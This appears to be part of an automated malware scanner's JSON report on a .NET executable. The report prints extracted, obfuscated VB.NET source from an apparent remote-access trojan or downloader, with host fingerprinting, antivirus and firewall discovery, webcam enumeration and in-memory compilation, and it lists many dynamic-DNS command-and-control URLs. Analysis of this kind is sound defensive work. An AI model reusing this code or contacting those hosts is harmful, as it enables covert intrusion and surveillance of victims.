            "    Public Function GetInfo() As Boolean",
            "        Try",
            "            With hGVOxfiDfjxIdqdQrOMoWnZdDdoiBxVqPHEPguQENlgJLrMRZP",
            "                .Item(\"volume_serial\") = HardwareID.GetVolumeSerial",
            "                .Item(\"computer_name\") = System.Environment.MachineName",
            "                .Item(\"user_name\") = System.Environment.UserName",
            "                .Item(\"os\") = ComputerInfo.OSName",
            "                .Item(\"av_name\") = ComputerInfo.AVName",
            "                .Item(\"FirewallName\") = ComputerInfo.FirewallName",
            "                .Item(\"interval\") = LISTEN_INTERVAL",
            "                .Item(\"uac\") = 0",
            "                If bYvRphepHVqenMGjlSmrzpVeediFMTxLKadgYwMFoXZtWaolUh.mMoTRznIypEOwvjjLTfIbzXpCpnhzwTDOTQbstPQZxeIXEKdlb() Then .Item(\"uac\") = 1",
            "                .Item(\"version\") = VERSION_BUILD",
            "                .Item(\"firstrun\") = DateTimeToTimestamp(New RATID().GetFirstExecution)",
            "                .Item(\"vno\") = GetVideoDevice().Length",
            "' aUmjHqBHDPfgCENkSuLrxRZOtppoteXeJjVlorjIlQzvkFvlzK",
            "' ssfStQcqYpbfGtqkDzXsRXTfiwSUdniMbtOhbRwGGFKunuZmlC",
            "' FIzYngQyBVxDQavJwiKgfHoGrvWvHBTRnJhaWhyNjWgEycdKej",
            "' eUzIJHMjqxconEILCbqjTBEYBFTPyMllMVhKdJgyYyKEWGcMWc",
            "                .Item(\"vc_running\") = 0",
            "                If bYvRphepHVqenMGjlSmrzpVeediFMTxLKadgYwMFoXZtWaolUh.IsVCRunning() Then .Item(\"vc_installed\") = 1",
            "            End With",
            "            NEXT_INTERVAL = 1000",
            "            Return True",
            "        Catch ex As Exception",
            "            Return False",
            "        End Try",
            "    End Function",
            "' gLjBNCysLIfPZfbmEFaclJpTjQWpxmSOONRDvDhItJNQIgKoYU",
            "' JdTKYiRREqSoBPwOzEdSPJbYvRpvrEHVqsCMHjzSmGzpVeediT",
            "' xGjwvMQSKjyqbJLfINblGTHtUqpSyQDHgHSMebxUskgsJYthqO",
            "' JmoVpuDrYghfkIPWzNMcgjazPIrZbwZdrnWkKKktGiChFXwXic",
            "    Const WM_CAP As Short = &H400S",
            "    Const WM_CAP_DRIVER_CONNECT As Integer = WM_CAP + 10",
            "    Const WM_CAP_DRIVER_DISCONNECT As Integer = WM_CAP + 11",
            "    Const WM_CAP_EDIT_COPY As Integer = WM_CAP + 30",
            "    Const WM_CAP_SET_PREVIEW As Integer = WM_CAP + 50",
            "    Const WM_CAP_SET_PREVIEWRATE As Integer = WM_CAP + 52",
            "    Const WM_CAP_SET_SCALE As Integer = WM_CAP + 53",
            "    Const WS_CHILD As Integer = &H40000000",
            "    Const WS_VISIBLE As Integer = &H10000000",
            "    Const SWP_NOMOVE As Short = &H2S",
            "    Const SWP_NOSIZE As Short = 1",
            "    Const SWP_NOZORDER As Short = &H4S",
            "    Const HWND_BOTTOM As Short = 1",
            "    Dim iDevice As Integer = 0 ' Current device ID",
            "    Dim hHwnd As Integer ' Handle to preview window",
            "    Declare Function SendMessage Lib \"user32\" Alias \"SendMessageA\" _",
            "        (ByVal hwnd As Integer, ByVal wMsg As Integer, ByVal wParam As Integer, _",
            "        <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.AsAny)> ByVal lParam As Object) As Integer",
            "    Declare Function SetWindowPos Lib \"user32\" Alias \"SetWindowPos\" (ByVal hwnd As Integer, _",
            "        ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, _",
            "        ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer",
            "    Declare Function DestroyWindow Lib \"user32\" (ByVal hndw As Integer) As Boolean",
            "    Declare Function capGetDriverDescriptionA Lib \"avicap32.dll\" (ByVal wDriver As Short, _",
            "    ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, _",
            "    ByVal cbVer As Integer) As Boolean",
            "    Public Function GetVideoDevice() As String()",
            "        Try",
            "            Dim deviceList As New System.Collections.ArrayList",
            "            Dim strName As String = Space(128)",
            "            Dim strVer As String = Space(128)",
            "            Dim bReturn As Boolean",
            "            Dim x As Integer = 0",
            "            Do",
            "                bReturn = capGetDriverDescriptionA(x, strName, 128, strVer, 128)",
            "                If bReturn Then",
            "                    deviceList.Add(strName.Trim)",
            "                End If",
            "                x += 1",
            "            Loop Until bReturn = False",
            "            Return ArrayListToStringArray(deviceList)",
            "        Catch ex As Exception",
            "            Return New String() {}",
            "        End Try",
            "    End Function",
            "' NwTDOUQbsHPQaxsWXELdlbHCDBGqxFVwvMCFvVxcaJwSIyNXGG",
            "' ssUcpRkQoGSGExQNjTekgrJKfgqOuYoUbuCrXSTRWIBImNyOSV",
            "End Class",
            "' MlOtdZOiYPdnWWJvWsGUCTFJiXUOgdzWuBwIMavxHRLoFXrwrg",
            "' MVWUZKDKoCBRVXPoEvgOQkNSfqLYMxZvuWEVHLlMXRjgDZxplx",
            "Public Class Convert",
            "    Public Shared Function ArrayListToString(ByVal list As System.Collections.ArrayList, Optional ByVal delimiter As String = \",\") As String",
            "        Try",
            "            Dim strArr As String() = CType(list.ToArray(GetType(String)), String())",
            "            Return String.Join(delimiter, strArr)",
            "        Catch ex As Exception",
            "' OdymvTOrtatzIwclmkpNTbFSRhlnfFUMwegBdiwsboOPpyLmHl",
            "            Return \"\"",
            "        End Try",
            "    End Function",
            "End Class",
            "' vOnOZTlVrbmrozRfnoxWRtvciCKzfabZePWdtVUkacUtWByhVq",
            "' KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpcbruxpPdWHoqLnsGRly",
            "Public Class VCInfo",
            "    Public Shared ReadOnly Property Size As Long",
            "        Get",
            "            Dim FolderSize As Long",
            "            Try",
            "                FolderSize = GetFolderSize(System.IO.Path.Combine(Environment.GetEnvironmentVariable(\"Appdata\"), \"Adobe\\Cache\"))",
            "                Return FolderSize",
            "            Catch ex As Exception",
            "                Return -1",
            "            End Try",
            "        End Get",
            "    End Property",
            "    Public Shared ReadOnly Property Installed As Boolean",
            "        Get",
            "            Return True",
            "        End Get",
            "    End Property",
            "    Public Shared Function GetFolderSize(ByVal folderFullPath As String, Optional ByVal includeSubFolders As Boolean = True) As Long",
            "        Dim fileSize As Long = 0",
            "        Dim directory As IO.DirectoryInfo = New IO.DirectoryInfo(folderFullPath)",
            "        For Each fileInfo As System.IO.FileInfo In directory.GetFiles()",
            "            Try",
            "                fileSize += fileInfo.Length",
            "            Catch ex As Exception",
            "' wXJZcfXvZEnjYsjanxggUGhEQeMdPTtheYqoLgFLHTWkHIRbWz",
            "            End Try",
            "        Next",
            "        If includeSubFolders Then",
            "            For Each subFolder As System.IO.DirectoryInfo In directory.GetDirectories()",
            "                Try",
            "                    fileSize += GetFolderSize(subFolder.FullName)",
            "                Catch ex As Exception",
            "' PhCVPFktusxibiNaZpsvnMbUFmoJlqEOjwkWxUTuctfjKkvpIF",
            "                End Try",
            "            Next",
            "        End If",
            "' bwWOKVmCXLUrmQSySYgVBKLJOlrydqpGKMEdskVDFZCHURzNmm",
            "        Return fileSize",
            "    End Function",
            "End Class",
            "' HPcEXDbsTtFyRzWGRXTevLSTdBvZbHOhpeKGGEJuBIZzyPFIzY",
            "' nSQxmHxoCMvuiiKSeHaGdvIvtnGDZJUZWhyzVWfEkOdKQjrhNI",
            "Public Class ComputerInfo",
            "    Public Shared Function ArrayListToString(ByVal list As System.Collections.ArrayList, Optional ByVal delimiter As String = \",\") As String",
            "        Try",
            "            Dim strArr As String() = CType(list.ToArray(GetType(String)), String())",
            "            Return String.Join(delimiter, strArr)",
            "        Catch ex As Exception",
            "' usxjcjOoaptwoNqVFBpKzqFPxxkXyVhvdugkKyvpIFcxWcYknC",
            "            Return \"\"",
            "        End Try",
            "    End Function",
            "    Public Shared ReadOnly Property OSName As String",
            "        Get",
            "            Try",
            "                Dim list As New System.Collections.ArrayList",
            "                Dim searcher As New Management.ManagementObjectSearcher(\"SELECT * FROM Win32_OperatingSystem\")",
            "                Dim collection As Management.ManagementObjectCollection = searcher.Get()",
            "                Dim Caption As String = \"\"",
            "                Dim OSArchitecture As String = \"\"",
            "                Dim CSDVersion As String = \"\"",
            "                For Each obj As Management.ManagementObject In collection",
            "                    Try",
            "                        Caption = obj(\"Caption\").ToString().Trim",
            "                    Catch ex As Exception",
            "                    End Try",
            "                    Try",
            "                        OSArchitecture = obj(\"OSArchitecture\").ToString().Trim",
            "                    Catch ex As Exception",
            "                        OSArchitecture = \"x32\"",
            "                    End Try",
            "                    Try",
            "                        CSDVersion = obj(\"CSDVersion\").ToString().Trim",
            "                    Catch ex As Exception",
            "                    End Try",
            "                    list.Add(Caption & \" (\" & OSArchitecture & \") \" & CSDVersion)",
            "                Next",
            "                Return ArrayListToString(list).Trim",
            "            Catch ex As Exception",
            "' KLUeZDSlFYTInwxvBlelQdcswyqQfXIprMotISmznZBXWxfwjn",
            "                Return \"\"",
            "            End Try",
            "        End Get",
            "    End Property",
            "    Public Shared ReadOnly Property AVName As String",
            "        Get",
            "            Try",
            "                Dim list As New System.Collections.ArrayList",
            "                Dim searcher As New Management.ManagementObjectSearcher(\"\\\\\" & Environment.MachineName & \"\\root\\SecurityCenter2\", \"SELECT * FROM AntivirusProduct\")",
            "                Dim collection As Management.ManagementObjectCollection = searcher.Get()",
            "                For Each obj As Management.ManagementObject In collection",
            "                    list.Add(obj(\"displayName\").ToString())",
            "                Next",
            "                Return ArrayListToString(list)",
            "            Catch ex As Exception",
            "' NnysLIeBZRNZpFaOXupTVCVbjYENOMRovDgtsJNPHgvnYGIdGK",
            "                Return \"\"",
            "            End Try",
            "        End Get",
            "    End Property",
            "    Public Shared ReadOnly Property FirewallName As String",
            "        Get",
            "            Try",
            "                Dim list As New System.Collections.ArrayList",
            "                Dim searcher As New Management.ManagementObjectSearcher(\"\\\\\" & Environment.MachineName & \"\\root\\SecurityCenter2\", \"SELECT * FROM FirewallProduct\")",
            "                Dim collection As Management.ManagementObjectCollection = searcher.Get()",
            "                For Each obj As Management.ManagementObject In collection",
            "                    list.Add(obj(\"displayName\").ToString())",
            "                Next",
            "                Return ArrayListToString(list)",
            "            Catch ex As Exception",
            "' QNvJiiKSfHbGewWwICUDaKUaWiyOVXgEyceLRkshNJJINxEMcD",
            "                Return \"\"",
            "            End Try",
            "        End Get",
            "    End Property",
            "End Class",
            "' CSILDbFjhPEYOFTdMMyzajvYrWuNYNKEWTqakqmyPQlnwUCeub",
            "End Module",
            "BSJB",
            "v2.0.50727",
            "#Strings",
            "#GUID",
            "#Blob",
            "<Module>",
            "mscorlib",
            "Microsoft.VisualBasic",
            "MyApplication",
            "MyComputer",
            "MyProject",
            "MyWebServices",
            "ThreadSafeObjectProvider`1",
            "tHggIRdFZEcuUuGzSBYI",
            "Microsoft.VisualBasic.ApplicationServices",
            "ApplicationBase",
            ".ctor",
            "Microsoft.VisualBasic.Devices",
            "Computer",
            "System",
            "Object",
            ".cctor",
            "get_Computer",
            "m_ComputerObjectProvider",
            "get_Application",
            "m_AppObjectProvider",
            "User",
            "get_User",
            "m_UserObjectProvider",
            "get_WebServices",
            "m_MyWebServicesObjectProvider",
            "Application",
            "WebServices",
            "Equals",
            "GetHashCode",
            "Type",
            "GetType",
            "ToString",
            "Create__Instance__",
            "instance",
            "Dispose__Instance__",
            "get_GetInstance",
            "m_ThreadStaticValue",
            "GetInstance",
            "Main",
            "SYUgwMTVeCwacJPiqfLH",
            "System.IO",
            "Stream",
            "System.Reflection",
            "Assembly",
            "QoEwgORlOSgqMZMyawuXFWIMlMXRjgEZxpmxPdymvUPrtauzIx",
            "dmmlqNUbGTSilogFUNwfhCeiwtcpPPqyLnHmLcDcnhzjGpBHDO",
            "ftCDNkfJKqwQYOtopnsdkrIjiyoriIkPNvjFulzKssffHPcEXD",
            "bonEIKCbpiTBDXzFSdxLykMihJqItxYyKEWTpMkcYjBQlZiGBe",
            "gNgmujPYZXczGOrFEUYaSrHyjRTnQVjfObBCclxZtYwPoPaUmV",
            "yKbcxyJgNqGmtMUKpkljoaTaEfQgkneEgMvrgBqhvGoobOoLYm",
            "StreamReader",
            "BOnnPXjMfLiBaBMGYIeOZebmESabkJEgiPVowYEzzyEouDTtsJ_ReadToEnd",
            "BOnnPXjMfLiBaBMGYIeOZebmESabkJEgiPVowYEzzyEouDTtsJ01",
            "wRtxMWrFreGcaDkCnrRrDwPMjFdVSduJeSbztXZGafndJSSRWs",
            "YdqBWjXJkHGhPgSWwXicurOjJBwIZoKxHeZDFlFLTInwxvBYel",
            "QdcswyqQfXIprMotHEmzZZBJWxSwVnNnysLtRBLRNZpFMOXupT",
            "VCIbjYEzzyEouDTtsJyCtSvaYGuPFvKUDDpqRamPiNlEPEBuNK",
            "System.CodeDom.Compiler",
            "CompilerResults",
            "voYHJdGLYVERqqSanPiOmEeEPJbLhRciepHVdeoMHklSZrzpVQ",
            "axsWYFLemcIDDCHryGWwvMCFwVydbJxSJzNXGGttUdpSlRoHTH",
            "FyQOkUekgsKKghqOvZoVbuDsYTUSXIBImNyPSVNmPteZOiZQdo",
            "XWKvXtGUCTFJjXVPheBWvBxJMbwxHRMpFYrLGuajkinYRYDQPf",
            "CompilerParameters",
            "HzjSUoRWjtPcQCdzxaIZLPpPaUmjHcBtpBSgCpzXSvwdxDLBgp",
            "OwUEOUQcsIPRaxsWYFLemcIDDCHryGWwvMCFwVydbJxSJzNXGG",
            "TdMMylNjvKrJuyYNKEWTqMkqmyCQlnwHCeuNhBukQZZYdOHOsG",
            "fHbGevIwtnGDaKUaWhyzVXgEkOeLRkshNJJIMxqxcDoEILDbFj",
            "rlEmJsEKGRixFGQniMOtBUcRwssqvhnuMmlCrumLnTRynIxoDN",
            "pBSgCpzXSvwdxDLBgppotQKRuIHXbeVuKDmUWrUYmiRfFFfoBd",
            "FFfoBdwczSrSdXpZvfpvrEUjqsCZUxzgmGOEjefdiTahxYYndg",
            "ZrzpVDDCHryGWwvMCFwVydbJxSJzNXGGttUdpSlRoHTHFyQOkU",
            "CYWygxjnNnysLIfBZSOZqFaOXvqTVCWbjZFOONSovDhutKNQIg",
            "System.ComponentModel",
            "EditorBrowsableAttribute",
            "EditorBrowsableState",
            "GeneratedCodeAttribute",
            "System.Diagnostics",
            "DebuggerHiddenAttribute",
            "Microsoft.VisualBasic.CompilerServices",
            "StandardModuleAttribute",
            "HideModuleNameAttribute",
            "System.ComponentModel.Design",
            "HelpKeywordAttribute",
            "System.Runtime.CompilerServices",
            "RuntimeHelpers",
            "GetObjectValue",
            "RuntimeTypeHandle",
            "GetTypeFromHandle",
            "Activator",
            "CreateInstance",
            "MyGroupCollectionAttribute",
            "System.Runtime.InteropServices",
            "ComVisibleAttribute",
            "ThreadStaticAttribute",
            "CompilerGeneratedAttribute",
            "GetManifestResourceStream",
            "AssemblyName",
            "GetName",
            "get_Name",
            "GetCallingAssembly",
            "GetManifestResourceNames",
            "ReadToEnd",
            "Exception",
            "CompilerErrorCollection",
            "get_Errors",
            "get_HasErrors",
            "ProjectData",
            "SetProjectError",
            "ClearProjectError",
            "get_CompiledAssembly",
            "set_GenerateInMemory",
            "System.Collections.Specialized",
            "StringCollection",
            "get_ReferencedAssemblies",
            "Strings",
            "CompareMethod",
            "Split",
            "AddRange",
            "VBCodeProvider",
            "String",
            "CodeDomProvider",
            "CompileAssemblyFromSource",
            "BindingFlags",
            "Binder",
            "InvokeMember",
            "STAThreadAttribute",
            "Debug_Downloader.vb",
            "CompilationRelaxationsAttribute",
            "RuntimeCompatibilityAttribute",
            "awvYFXJNmNYSkhEayqmy",
            "awvYFXJNmNYSkhEayqmy.exe",
            "R#PNOX\u01bfX",
            "MyTemplate",
            "8.0.0.0",
            "My.Computer",
            "My.User",
            "My.Application",
            "My.WebServices",
            "4System.Web.Services.Protocols.SoapHttpClientProtocol",
            "Create__Instance__",
            "Dispose__Instance__",
            "WrapNonExceptionThrows",
            "_CorExeMain",
            "mscoree.dll"
        ],
        "file": {
            "awvYFXJNmNYSkhEayqmy.exe": "Executable",
            "mscoree.dll": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://ps2tissuskh2.byethost11.com/a.php?hash=allhttp://vu6sabeydig1su.no-ip.org/a.php?hash=allhttp://amp5eqambsyz4o.no-ip.org/a.php?hash=allhttp://hohepasnorri.dyndns.org/a.php?hash=allhttp://hohepasnorri.shorturl.com/a.php?hash=allhttp://hesiodephesius.byethost11.com/a.php?hash=allhttp://yvohaik.dyndns.org/a.php?hash=allhttp://yvohaik.filetap.com/a.php?hash=allhttp://vasileaviyah.servebeer.com/a.php?hash=allhttp://tatianusvincent.byethost11.com/a.php?hash=allhttp://liboriobo.dyndns.org/a.php?hash=allhttp://eustachuspyotr.zapto.org/a.php?hash=allhttp://vladimiradelbert.byethost11.com/a.php?hash=all",
            "http://www.google.com/"
        ]
    },
    "time": "0:00:00.883776",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "packer_compiler_signatures.yar": "IsPE32"
        },
        {
            "packer_compiler_signatures.yar": "IsNET_EXE"
        },
        {
            "packer_compiler_signatures.yar": "IsWindowsGUI"
        },
        {
            "packer_compiler_signatures.yar": "HasOverlay"
        },
        {
            "crypto_signatures.yar": "Big_Numbers1"
        }
    ]
}
